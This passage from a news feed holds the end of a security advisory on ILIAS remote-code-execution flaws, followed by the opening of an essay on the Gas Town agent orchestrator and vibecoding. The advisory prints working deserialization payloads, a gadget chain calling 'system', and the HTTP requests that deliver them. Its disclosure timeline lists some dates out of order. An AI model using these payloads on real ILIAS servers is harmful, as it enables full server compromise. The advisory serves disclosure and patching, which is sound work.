    &lt;p&gt;We embed the payload in the following XML structure to trigger the &lt;code&gt;unserialize&lt;/code&gt; call for the &lt;code&gt;taxFilter&lt;/code&gt; field of &lt;code&gt;RandomQuestionSelectionDefinition&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt;
&amp;lt;!DOCTYPE Test SYSTEM "http://www.ilias.uni-koeln.de/download/dtd/ilias_co.dtd"&amp;gt;
&amp;lt;!--Export of ILIAS Test 326 of installation 0--&amp;gt;
&amp;lt;ContentObject Type="Test"&amp;gt;
&amp;lt;RandomQuestionSetConfig&amp;gt;
  &amp;lt;RandomQuestionStage&amp;gt;&amp;lt;/RandomQuestionStage&amp;gt;
  &amp;lt;RandomQuestionSelectionDefinitions&amp;gt;
    &amp;lt;RandomQuestionSelectionDefinition poolId="320" amountMode="" poolQuestCount="1" questAmount="1" position="0" taxFilter='O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}' homogeneous="" synctimestamp=""/&amp;gt;
    &amp;lt;/RandomQuestionSelectionDefinitions&amp;gt;
  &amp;lt;/RandomQuestionSetConfig&amp;gt;
&amp;lt;/ContentObject&amp;gt;&lt;/code&gt;
    &lt;p&gt;When the payload is embedded in a valid ILIAS import archive, uploading it through the import endpoint results in RCE. The request below illustrates the process:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=importuploadhandlergui&amp;amp;cmd=upload HTTP/1.1
Host: lab1.local
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: multipart/form-data; boundary=----ABC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://lab1.local
Referer: http://lab1.local/ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:pp&amp;amp;cmdClass=ilObjRootFolderGUI&amp;amp;cmd=render&amp;amp;ref_id=1
Accept-Encoding: gzip, deflate, br
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i;
Connection: keep-alive

------ABC
Content-Disposition: form-data; name="file"; filename="1757316449__0__tst_326.zip"
Content-Type: application/zip
&amp;lt;ZIP_FILE_TO_UPLOAD&amp;gt;

------ABC--&lt;/code&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to use the described import functionality √¢ typically course administrators or similar roles.&lt;/p&gt;
    &lt;head rend="h1"&gt;3. Authenticated RCE (CVE-2025-11346)&lt;/head&gt;
    &lt;p&gt;A third RCE related to insecure deserialization affects the &lt;code&gt;f_settings&lt;/code&gt; URL parameter. This is especially interesting as we do not need to prepare any file input. We can simply pass our command as part of the request. Exploitation works in a similar way as above, but the serialized string can be directly encoded in Base64 without the need to wrap it in XML:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:qx:1l&amp;amp;cmdClass=ilias\test\settings\scorereporting\settingsscoringgui&amp;amp;cmd=cancelSaveForm&amp;amp;ref_id=102&amp;amp;ref_id=104 HTTP/1.1
Host: lab1.local
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i
Content-Type: application/x-www-form-urlencoded

f_settings=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6Mzp7UzoxNjoiXDAwXDJhXDAwXDcwXDYxXDczXDczXDc0XDY4XDcyXDc1XDRjXDY1XDc2XDY1XDZjIjtpOjA7Uzo5OiJcMDBcMmFcMDBcNjJcNzVcNjZcNjZcNjVcNzIiO2E6MTp7Uzo0OiJcNzRcNjVcNzNcNzQiO2E6Mjp7aTowO1M6Mzk6Ilw2NVw2M1w2OFw2ZlwyMFwyN1w1M1w1Mlw0Y1w2MVw2Mlw3M1wyMFw3N1w2MVw3M1wyMFw2OFw2NVw3Mlw2NVwyN1wyMFwzZVwyMFwyZlw3NFw2ZFw3MFwyZlw1Zlw1Zlw1MFw1N1w0ZVw0NVw0NFw1Zlw1ZiI7Uzo1OiJcNmNcNjVcNzZcNjVcNmMiO047fX1TOjEwOiJcMDBcMmFcMDBcNjhcNjFcNmVcNjRcNmNcNjVcNzIiO086Mjg6Ik1vbm9sb2dcSGFuZGxlclxHcm91cEhhbmRsZXIiOjE6e1M6MTM6IlwwMFwyYVwwMFw3MFw3Mlw2Zlw2M1w2NVw3M1w3M1w2Zlw3Mlw3MyI7YToyOntpOjA7Uzo3OiJcNjNcNzVcNzJcNzJcNjVcNmVcNzQiO2k6MTtTOjY6Ilw3M1w3OVw3M1w3NFw2NVw2ZCI7fX19&lt;/code&gt;
    &lt;p&gt;Supplied input is passed directly to the getRelayedRequest() method, where it is Base64-decoded and then deserialized:&lt;/p&gt;
    &lt;code&gt;private function getRelayedRequest(): Request
{
    return unserialize(
        base64_decode(
            $this-&amp;gt;request-&amp;gt;getParsedBody()[self::F_CONFIRM_SETTINGS]
        )
    );
}&lt;/code&gt;
    &lt;p&gt;This simple flow enables direct execution of attacker-controlled payloads, resulting in RCE for authenticated users.&lt;/p&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to call &lt;code&gt;ScoreReportingGUI&lt;/code&gt; endpoints that take the &lt;code&gt;f_settings&lt;/code&gt; parameter.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;ILIAS is a versatile and correspondingly complex platform. With about 1.2 million lines of PHP code, decades of features, and a broad plugin ecosystem, it√¢s no surprise that subtle edge cases can lead to serious security vulnerabilities.&lt;/p&gt;
    &lt;p&gt;None of this makes ILIAS a √¢bad choice√¢ for eLearning per se. It√¢s open source, widely deployed, and backed by an active community. Nonetheless, operators need to treat ILIAS like any other critical application and apply security updates promptly: Track advisories, patch within standard change windows and prepare an expedited path for RCEs, keep extensions lean and current, and avoid falling behind for multiple minor versions.&lt;/p&gt;
    &lt;p&gt;Security Research Labs engages in a broad range of offensive and defensive IT security consulting such as red teaming, code audits and strategic security assessments. If this kind of work excites you, we are hiring!&lt;/p&gt;
    &lt;p&gt;This blog post is the second part of a two-part series on security vulnerabilities in ILIAS:&lt;/p&gt;
    &lt;head rend="h2"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;As per standard practice, we disclosed all identified vulnerabilities to the vendor before publishing this blog post. The full disclosure timeline is provided below.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2025-07-24: Discovered RCE #1 and #2&lt;/item&gt;
      &lt;item&gt;2025-08-25: Discovered RCE #3. Creating PoC and writeup&lt;/item&gt;
      &lt;item&gt;2025-09-03: Requested CVE IDs&lt;/item&gt;
      &lt;item&gt;2025-09-08: Notified vendor&lt;/item&gt;
      &lt;item&gt;2025-09-15: Vendor verified vulnerabilities&lt;/item&gt;
      &lt;item&gt;2025-09-23: Initial patches releases (8.24, 9.14, 10.2)&lt;/item&gt;
      &lt;item&gt;2025-09-25: Unauth RCE Fix bypass discovered&lt;/item&gt;
      &lt;item&gt;2025-09-26: Vendor notified&lt;/item&gt;
      &lt;item&gt;2025-08-29: CVE ID requested for unauthenticated RCE vulnerability bypass.&lt;/item&gt;
      &lt;item&gt;2025-09-06: CVE IDs assigned (CVE-2025-11344, CVE-2025-11345, CVE-2025-11346)&lt;/item&gt;
      &lt;item&gt;2025-09-07: Requested a CNA score update because the current CVSS 5.1 for CVE-2025-11344 is incorrect and understates the impact of an unauthenticated RCE vulnerability *&lt;/item&gt;
      &lt;item&gt;2025-09-23: Patches released (8.25, 9.15, 10.3)&lt;/item&gt;
      &lt;item&gt;2026-01-23: Publication of this blog post and CVE IDs&lt;/item&gt;
      &lt;item&gt;2026-01-23: Request for update published CVE on MITRE&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;* We also contacted the vendor regarding the CVSS rating, which appears to have been assigned arbitrarily without a transparent scoring matrix or justification. Unfortunately, we did not receive a response. This lack of transparency creates a significant issue for software operators, as the true severity of the vulnerability cannot be reliably assessed based on the CVE entry. As a result, there is a risk that affected systems were not updated in a timely manner due to the misleadingly low severity rating.&lt;/p&gt;
    &lt;head rend="h2"&gt;Advisories and release notes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.2&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.3&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.14&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.15&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.24&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.25&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Researchers involved&lt;/head&gt;
    &lt;p&gt;Daniel K√É¬∂hler, Florian Wilkens, Rachna Shriwas, Rene Rehme, Mahmoud Anas Khalifa&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733899</guid><pubDate>Fri, 23 Jan 2026 15:48:54 +0000</pubDate></item><item><title>Gas Town's Agent Patterns, Design Bottlenecks, and Vibecoding at Scale</title><link>https://maggieappleton.com/gastown</link><description>&lt;doc fingerprint="3714585349c384a7"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;p&gt;A few weeks ago Steve Yegge published an elaborate manifesto and guide to Gas Town, his Mad-Max-Slow-Horses-Waterworld-etc-themed agent orchestrator that runs dozens of coding agents simultaneously in a metaphorical town of automated activity. Gas Town is entirely vibecoded, hastily designed with off-the-cuff solutions, and inefficiently burning through thousands of dollars a month in API costs.&lt;/p&gt;
    &lt;p&gt;This doesn‚Äôt sound promising, but it‚Äôs lit divisive debates and sparks of change across the software engineering community. A small hype machine has formed around it. It‚Äôs made the rounds through every engineering team‚Äôs Slack, probably twice. There‚Äôs somehow already a $GAS meme coin doing over $400k in earnings. This was not Yegge‚Äôs doing ‚Äì someone else set it up on the crypto platform Bags which ties tokens to individual creators. The coin holds no legitimate relationship to Gas Town‚Äôs success or failure so this is the purest of pure speculative betting. I expect nothing less from the crypto bros. And the hype is justified. First, because it‚Äôs utterly unhinged, and second because it‚Äôs a serious indication of how agents will change the nature of software development from this point on.&lt;/p&gt;
    &lt;p&gt;You should at least skim through Yegge‚Äôs original article before continuing to read my reflections. First, because I‚Äôm not going to comprehensively summarise it. A challenging task given the sprawling, haphazard nature of the piece And second, because a even a one minute glance over Yegge‚Äôs style of writing will make the vibes clear.&lt;/p&gt;
    &lt;p&gt;We should take Yegge‚Äôs creation seriously not because it‚Äôs a serious, working tool for today‚Äôs developers (it isn‚Äôt). But because it‚Äôs a good piece of speculative design fiction that asks provocative questions and reveals the shape of constraints we‚Äôll face as agentic coding systems mature and grow.&lt;/p&gt;
    &lt;p&gt;‚ÄúDesign fiction‚Äù or ‚Äúspeculative design‚Äù is a branch of design where you creating things (objects, prototypes, sketches) from a plausible near future. Not to predict what‚Äôs going to happen, but to provoke questions and start conversations about what could happen. Not in a bright-and-glorious-flying-cars way that futurism can sometimes fall into. But, most helpfully, in a way that thinks about banal details, overlooked everyday interactions, low status objects, imperfect implementations, knock-on effects, and inconveniences. See the Near Future Lab‚Äôs short explainer video and their Manual of Design Fiction if you want to learn more.&lt;/p&gt;
    &lt;p&gt;I also think Yegge deserves praise for exercising agency and taking a swing at a system like this, despite the inefficiencies and chaos of this iteration. And then running a public tour of his shitty, quarter-built plane while it‚Äôs mid-flight.&lt;/p&gt;
    &lt;p&gt;When I was taken to the Tate Modern as a child I‚Äôd point at Mark Rothko pieces and say to my mother ‚ÄúI could do that‚Äù, and she would say ‚Äúyes, but you didn‚Äôt.‚Äù Many people have talked about what large-scale, automated agent orchestration systems could look like in a few years, and no one else attempted to sincerely build it.&lt;/p&gt;
    &lt;p&gt;I should be transparent and say that I have not used Gas Town in earnest on any serious work. I have only lightly poked at it, because I do not qualify as a serious user when I‚Äôm still hovering around stages 4-6 in Yegge‚Äôs 8 levels of automation:&lt;/p&gt;
    &lt;p&gt;I currently juggle a handful of consecutive Claude Code and OpenCode agents, but pay close attention to the diffs and regularly check code in an IDE. Which I guess puts me in the agentically conservative camp in this distressingly breakneck moment in history.&lt;/p&gt;
    &lt;p&gt;Gas Town is a full-on stage 8 piece of tooling: using an orchestrator that manages dozens+ of other coding agents for you. Yegge also warned me not to seriously use Gas Town multiple times, in increasingly threatening typography. I trust his guidance on his own slush pile.&lt;/p&gt;
    &lt;p&gt;But I have grokked the basic concepts and spent more time with this manifesto than is warranted. And here is what stood out to me from the parts I could comprehend:&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Design and planning becomes the bottleneck when agents write all the code&lt;/head&gt;
    &lt;p&gt;When you have a fat stack of agents churning through code tasks, development time is no longer the bottleneck. Yegge says ‚ÄúGas Town churns through implementation plans so quickly that you have to do a LOT of design and planning to keep the engine fed.‚Äù Design becomes the limiting factor: imagining what you want to create and then figuring out all the gnarly little details required to make your imagination into reality.&lt;/p&gt;
    &lt;p&gt;I certainly feel this friction in both my own professional work and personal projects. My development velocity is far slower than Yegge since I only wrangle a few agents at a time and keep my eyes and hands on the code. But the build time is rarely what holds me up. It is always the design; how should we architect this? What should this feel like? How should this look? Is that transition subtle enough? How composable should this be? Is this the right metaphor?&lt;/p&gt;
    &lt;p&gt;When it‚Äôs not the design, it‚Äôs the product strategy and planning; What are the highest priority features to tackle? Which piece of this should we build first? When do we need to make that decision? What‚Äôs the next logical, incremental step we need to make progress here?&lt;/p&gt;
    &lt;p&gt;These are the kind of decisions that agents cannot make for you. They require your human context, taste, preferences, and vision.&lt;/p&gt;
    &lt;p&gt;With agents to hand, it‚Äôs easy to get ahead of yourself, stumbling forward into stacks of generated functions that should never have been prompted into existence, because they do not correctly render your intentions or achieve your goals.&lt;/p&gt;
    &lt;p&gt;Gas Town seems to be halfway into this pitfall. The biggest flaw in Yegge‚Äôs creation is that it is poorly designed. I mean this in the sense that he absolutely did not design the shape of this system ahead of time, thoughtfully considering which metaphors and primitives would make this effective, efficient, easy to use, and comprehensible.&lt;/p&gt;
    &lt;p&gt;He just made stuff up as he went. He says as much himself: ‚ÄúGas Town is complicated. Not because I wanted it to be, but because I had to keep adding components until it was a self-sustaining machine.‚Äù Gas Town is composed of ‚Äúespecially difficult [theories] because it‚Äôs a bunch of bullshit I pulled out of my arse over the past 3 weeks, and I named it after badgers and stuff.‚Äù It was slapdashed together over ‚Äú17 days, 75k lines of code, 2000 commits. It finally got off the ground (GUPP started working) just 2 days ago.‚Äù Do not ask what GUPP is; I cannot concisely explain without getting deep into it. Which we‚Äôll do in a minute.&lt;/p&gt;
    &lt;p&gt;This Hacker News comment from qcnguy describes the problem well, and points out that Yegge‚Äôs previous Beads project, of which Gas Town is an extension, suffers the same issue:&lt;/p&gt;
    &lt;p&gt;‚ÄúBeads is a good idea with a bad implementation. It‚Äôs not a designed product in the sense we are used to, it‚Äôs more like a stream of consciousness converted directly into code. It‚Äôs a program that isn‚Äôt only vibe coded, it was vibe designed too.‚Äù&lt;/p&gt;
    &lt;p&gt;‚ÄúGas Town is clearly the same thing multiplied by ten thousand. The number of overlapping and ad hoc concepts in this design is overwhelming. Steve is ahead of his time but we aren‚Äôt going to end up using this stuff. Instead a few of the core insights will get incorporated into other agents in a simpler but no less effective way.‚Äù&lt;/p&gt;
    &lt;p&gt;Or this review from astrra.space on Bluesky:&lt;/p&gt;
    &lt;p&gt;‚Äúgas town [is] such a nightmare to use i love it‚Ä¶ the mayor is dumb as rocks the witness regularly forgets to look at stuff the deacon makes his own rules the crew have the object permanence of a tank full of goldfish and the polecats seem intent on wreaking as much chaos on the project as they can. this is peak entertainment i swear‚Äù&lt;/p&gt;
    &lt;p&gt;Friends and colleagues of mine who have been brave enough to try out Gas Town in more depth report the same thing; this thing fits the shape of Yegge‚Äôs brain and no one else‚Äôs. I‚Äôd categorise that as a moderate design fail, given this is a public product that I assume Yegge wants at least some people to try out. The onboarding is baptism by fire.&lt;/p&gt;
    &lt;p&gt;This feels like one of the most critical, emerging footguns of liberally hands-off agentic development. You can move so fast you never stop to think. It is so easy to prompt, you don‚Äôt fully consider what you‚Äôre building at each step of the process. It is only once you are hip-deep in poor architectural decisions, inscrutable bugs, and a fuzzy memory of what you set out to do, do you realise you have burned a billion tokens in exchange for a pile of hot trash.&lt;/p&gt;
    &lt;head rend="h2"&gt;2. Buried in the chaos are sketches of future agent orchestration patterns&lt;/head&gt;
    &lt;p&gt;Now that I‚Äôve just critiqued the design of Gas Town, I will turn around and say that while the current amalgamation of polecats, convoys, deacons, molecules, protomolecules, mayors, seances, hooks, beads, witnesses, wisps, rigs, refineries, and dogs is a bunch of under cooked spaghetti, Yegge‚Äôs patterns roughly sketch out some useful conceptual shapes for future agentic systems.&lt;/p&gt;
    &lt;p&gt;If you step back and squint, this mishmash of concepts reveals a few underlying patterns that future agentic systems will likely follow:&lt;/p&gt;
    &lt;head rend="h3"&gt;Agents have specialised roles with hierarchical supervision&lt;/head&gt;
    &lt;p&gt;Every agent in Gas Town has a permanent, specialised role. When an agent spins up a new session, it knows who it is and what job it needs to do. Some examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Mayor is the human concierge: it‚Äôs the main agent you talk to. It talks to all the other agents for you, kicking off work, receiving notifications when things finish, and managing the flow of production.&lt;/item&gt;
      &lt;item&gt;Polecats are temporary grunt workers. They complete single, isolated tasks, then disappear after submitting their work to be merged.&lt;/item&gt;
      &lt;item&gt;The Witness supervises the Polecats and helps them get unstuck. Its job is to solve problems and nudge the proletariat workers along.&lt;/item&gt;
      &lt;item&gt;The Refinery manages the merge queue into the main branch. It evaluates each piece of work waiting to be merged, resolving conflicts in the process. It can creatively ‚Äúre-imagine‚Äù implementations if merge conflicts get too hairy, while trying to keep the intent of the original work.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are many more characters in this town, but these give you a flavour of the system. Giving each agent a single job means you can prompt them more precisely, limit what they‚Äôre allowed to touch, and run lots of them at once without them stepping on each other‚Äôs toes.&lt;/p&gt;
    &lt;p&gt;There‚Äôs also a clear chain of command between these agents. You talk to the Mayor, who coordinates work across the system. The Mayor in Gas Town never writes code. It talks to you, then creates work tasks and assigns them to workers. A set of system supervisors called the Witness, the Deacon, and ‚ÄúBoot the Dog‚Äù intermittently nudge the grunt workers and each other to check everyone is doing their work. Oh and there‚Äôs also a crew of ‚Äúdogs‚Äù who do maintenance and cleaning.&lt;/p&gt;
    &lt;p&gt;It‚Äôs easier if I try and show you. Here‚Äôs the basic relationship structure of Gas Town, as best I can make out:&lt;/p&gt;
    &lt;p&gt;Since I‚Äôm making my own visuals here, I should justify it by pointing out that while Yegge made lots of his own ornate, zoopmorphic diagrams of Gas Town‚Äôs architecture and workflows, they are unhelpful. Primarily because they were made entirely by Gemini‚Äôs Nano Banana . And while Nano Banana is state-of-the-art at making diagrams, generative AI systems are still really shit at making illustrative diagrams. They are very hard to decipher, filled with cluttered details, have arrows pointing the wrong direction, and are often missing key information. Case in point:&lt;/p&gt;
    &lt;p&gt;Does this help you understand how the system works? No? No.&lt;/p&gt;
    &lt;p&gt;Gas Town‚Äôs hierarchical approach solves both a coordination and attention problem. Without it, you are the one assigning tasks to dozens individual agents, checking who‚Äôs stuck, who‚Äôs idle, and who‚Äôs waiting on work from someone else. With the Mayor as your single interface, that overhead disappears. You can continuously talk to the Mayor without interrupting any agents or getting in the way, or having to think much about which one is doing what. This is less cognitive overhead than constantly switching tabs between Claudes.&lt;/p&gt;
    &lt;p&gt;I think there‚Äôs a lot of opportunity to diversify the cast of characters here and make more use of specialist subagents . The agents in Gas Town are all generalist workers in the software development pipeline. But we could add in any kind of specialist we want: a dev ops expert, a product manager, a front-end debugger, an accessibility checker, a documentation writer. These would be called in on-demand to apply their special skills and tools.&lt;/p&gt;
    &lt;head rend="h3"&gt;Agent roles and tasks persist, sessions are ephemeral&lt;/head&gt;
    &lt;p&gt;One of the major limitations of current coding agents is running out of context. Before you even hit the limits of a context window, context rot degrades the output enough that it‚Äôs not worth keeping. We constantly have to compact or start fresh sessions.&lt;/p&gt;
    &lt;p&gt;Gas Town‚Äôs solution to this is make each agent session disposable by design. It stores the important information ‚Äì agent identities and tasks ‚Äì in Git, then liberally kills off sessions and spins up fresh ones when needed. New sessions are told their identity and currently assigned work, and continue on where the last one left off. Gas Town also lets new sessions ask their predecessors what happened through ‚Äúseancing‚Äù: resuming the last session as a separate instance in order to let the new agent ask questions about unfinished work.&lt;/p&gt;
    &lt;p&gt;This saving and recalling is all done through Gas Town‚Äôs ‚ÄúBeads‚Äù system. Beads is also the name of the memory management system Yegge built before Gas Town; a precursor to this more ambitious civilisation. Beads are tiny, trackable units of work ‚Äì like issues in an issue tracker ‚Äì stored as JSON in Git alongside your code. Each bead has an ID, description, status, and assignee. Agent identities are also stored as beads, giving each worker a persistent address that survives session crashes.&lt;/p&gt;
    &lt;p&gt;Yegge didn‚Äôt invent this pattern of tracking atomic tasks outside agent memory in something structured like JSON. Anthropic described the same approach in their research on effective harnesses for long-running agents , just published in November 2025. I give it a hot minute before this type of task tracking lands in Claude Code.&lt;/p&gt;
    &lt;head rend="h3"&gt;Feeding agents continuous streams of work&lt;/head&gt;
    &lt;p&gt;The whole promise of an orchestration system like Gas Town is it‚Äôs a perpetual motion machine. You give high-level orders to the mayor, and then a zoo of agents kicks off to break it down into tasks, assign them, execute them, check for bugs, fix the bugs, review the code, and merge it in.&lt;/p&gt;
    &lt;p&gt;Each worker agent in Gas Town has its own queue of assigned work and a ‚Äúhook‚Äù pointing to the current thing they should be doing. The minute they finish a task, the next one jumps to the front of the queue. The mayor is the one filling up these queues ‚Äì it‚Äôs in charge of breaking down large features into atomic tasks and assigning them to available workers. In theory, the workers are never idle or lacking tasks, so long as you keep feeding the mayor your grand plans.&lt;/p&gt;
    &lt;p&gt;This principle of ‚Äúworkers always do their work‚Äù is better in theory than practice. It turns out to be slightly difficult to make happen because of the way current models are trained. They‚Äôre designed as helpful assistants who wait politely for human instructions. They‚Äôre not used to checking a task queue and independently getting on with things.&lt;/p&gt;
    &lt;p&gt;Gas Town‚Äôs patchwork solution to this is aggressive prompting and constant nudging. Supervisor agents spend their time poking workers to see if anyone‚Äôs stalled out or run dry on work. When one goes quiet, they send it a ping which jolts the agent into checking its queue and getting back to work. These periodic nudges move through the agent hierarchy like a heartbeat keeping everything moving. This is a decent band-aid for the first version, but more serious efforts at agent orchestration systems will need reliable ways to keep agents on task.&lt;/p&gt;
    &lt;head rend="h3"&gt;Merge queues and agent-managed conflicts&lt;/head&gt;
    &lt;p&gt;When you have a bunch of agents all working in parallel, you‚Äôre of course going to run into merge conflicts. Each agent is off on its own branch, and by the time it finishes its task, the main branch might look completely different ‚Äì other changes have landed, the code has moved on. The later an agent finishes, the worse this gets. Normally you, the human, takes on the burden of sorting out the mess and deciding which changes to keep. But if agents are running on their own, something has to do that job for them.&lt;/p&gt;
    &lt;p&gt;So Gas Town has a dedicated merge agent ‚Äì the Refinery ‚Äì that works through the merge queue one change at a time. It looks at each merge request, resolves any conflicts, and gets it into main. When things get really tangled ‚Äì when so much has changed that the original work doesn‚Äôt even make sense anymore ‚Äì it can creatively ‚Äúre-imagine‚Äù the changes: re-doing the work to fit the new codebase. Or escalate to a human if needed.&lt;/p&gt;
    &lt;p&gt;But there‚Äôs another way to sidestep merge conflict nightmares that Gas Town doesn‚Äôt have built in: ditch PRs for stacked diffs . The traditional git workflow puts each feature on its own branch for days or weeks, accumulating commits, then getting merged back as one chunky PR.&lt;/p&gt;
    &lt;p&gt;Stacked diffs avoid this conflict-prone approach by breaking work into small, atomic changes that each get reviewed and merged on their own, building on top of each other. Every change gets its own branch, forked off the previous change, forming a ‚Äústack‚Äù of changes dependent on one another. When a change earlier in the stack gets updated, all the changes below it automatically rebase on top of the new version.&lt;/p&gt;
    &lt;p&gt;This fits how agents naturally work. They‚Äôre already producing tiny, focused changes rather than sprawling multi-day branches. When conflicts do pop up, they‚Äôre easier to untangle because each diff touches less code. Cursor ‚Äôs recent acquisition of Graphite , a tool built specifically for stacked diff workflows, suggests I am not the only one who sees this opportunity. When you‚Äôve got dozens of agents landing changes continuously, you need tools and interfaces specifically designed for these frequent, incremental merges.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. The price is extremely high, but so is the (potential) value&lt;/head&gt;
    &lt;p&gt;Yegge describes Gas Town as ‚Äúexpensive as hell‚Ä¶ you won‚Äôt like Gas Town if you ever have to think, even for a moment, about where money comes from.‚Äù He‚Äôs on his second Claude account to get around Anthropic‚Äôs spending limits.&lt;/p&gt;
    &lt;p&gt;I can‚Äôt find any mention online of the per-account limits, but let‚Äôs conservatively assume he‚Äôs spending at least $2,000 USD per month, and liberally $5,000. Now covered by the $75,000 he‚Äôs earned in transaction fees from the $GAS cryptocoin, which gives him a good year to run this at scale&lt;/p&gt;
    &lt;p&gt;The current cost is almost certainly artificially inflated by system inefficiency. Work gets lost, bugs get fixed numerous times, designs go missing and need redoing. As models improve and orchestration patterns mature, the cost of orchestrators like this should drop while output quality rises.&lt;/p&gt;
    &lt;p&gt;I expect companies would happily pay around the $1-3k/month mark for a sane, understandable, higher quality, and lower waste version of Gas Town. Maybe that sounds absurd to you, given we‚Äôve all become anchored to the artificially low rate of $100-200/month for unlimited usage by the major providers. But once the AI bubble pops, the VC funds dry up, and providers have to charge the true cost of inference at scale, we should expect that ‚Äúunlimited‚Äù tier to look a lot pricier.&lt;/p&gt;
    &lt;p&gt;Even when that comes to pass, a few thousand is pretty reasonable when you compare it to an average US senior developer salary: $120,000 USD. Salary average from Indeed . Many people will pick bones over this because the market range is so broad. FAANG engineers in San Fransisco are paid closer to half a million, while developers in Europe are used to salaries in the $30-50k range. This seems like a sensible middle ground. If Gas Town could genuinely speed up the work of a senior developer by 2-3x or more, it would easily be worth 10-30% of their salary. The cost per unit of valuable work starts to look competitive with human labor.&lt;/p&gt;
    &lt;p&gt;The maths on paying for something like this is already defensible in wealthier places like the US and parts of Western Europe. In spots where developer salaries are lower, we would expect the budget for AI assisted tools adjusts accordingly. They‚Äôll get less crazy scaled automation and more conversative useage with humans filling in the cognitive gaps.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Yegge never looks at code. When should we stop looking too?&lt;/head&gt;
    &lt;p&gt;Yegge is leaning into the true definition of vibecoding with this project: ‚ÄúIt is 100% vibecoded. I‚Äôve never seen the code, and I never care to.‚Äù Not looking at code at all is a very bold proposition, today, in January 2026.&lt;/p&gt;
    &lt;p&gt;Given the current state of models and the meagre safeguards we have in place around them, the vast majority of us would consider this blind coding approach irresponsible and daft to do on anything that isn‚Äôt a throwaway side project. Which, given the amount of effort and Claude tokens Yegge has sunk into building it, writing documentation, and publicly promoting it, Gas Town is not.&lt;/p&gt;
    &lt;p&gt;‚ÄúShould developers still look at code?‚Äù will become one of the most divisive and heated debates over the coming years. You might be offended by the question, and find it absurd anyone is asking. But it‚Äôs a sincere question and the answer will change faster than you think.&lt;/p&gt;
    &lt;p&gt;I‚Äôm already seeing people divide along moralistic, personal identity lines as they try to answer it. Some declare themselves purist, AI skeptic, Real Developers who check every diff and hand-adjust specific lines, sneering at anyone reckless enough to let agents run free. While others lean into agentic maximalism, directing fleets from on high and pitying the mass of luddites still faffing about with manual edits like it‚Äôs 2019. Both camps mistake a contextual judgement for a personality trait and firm moral position.&lt;/p&gt;
    &lt;p&gt;A more conservative, easier to consider, debate is: how close should the code be in agentic software development tools? How easy should it be to access? How often do we expect developers to edit it by hand?&lt;/p&gt;
    &lt;p&gt;Interfaces like Claude Code , Cursor , and Conductor do not put code front and centre in the experience. The agent is your first and primary interface. You might be able to see diffs rolls by or display code files inline, but you can‚Äôt touch them. Trying to edit code yourself is a roundabout journey of opening your IDE and navigating to the correct files and lines.&lt;/p&gt;
    &lt;p&gt;This design choice assumes it is easier to ask an agent to make the change for you, than it is to type it out the syntax yourself. They clearly say ‚Äúwe don‚Äôt believe users need to touch code.‚Äù&lt;/p&gt;
    &lt;p&gt;Framing this debate as an either/or ‚Äì either you look at code or don‚Äôt, either you edit code by hand or you exclusively direct agents, either you‚Äôre the anti-AI-purist or the agentic-maxxer ‚Äì is unhelpful. Because nothing is a strict binary.&lt;/p&gt;
    &lt;p&gt;The right distance isn‚Äôt about what kind of person you are or what you believe about AI capabilities in the current moment. How far away you step from the syntax shifts based on what you‚Äôre building, who you‚Äôre building with, and what happens when things go wrong. The degree of freedom you hand over to agents depends on:&lt;/p&gt;
    &lt;head rend="h3"&gt;Domain and programming language&lt;/head&gt;
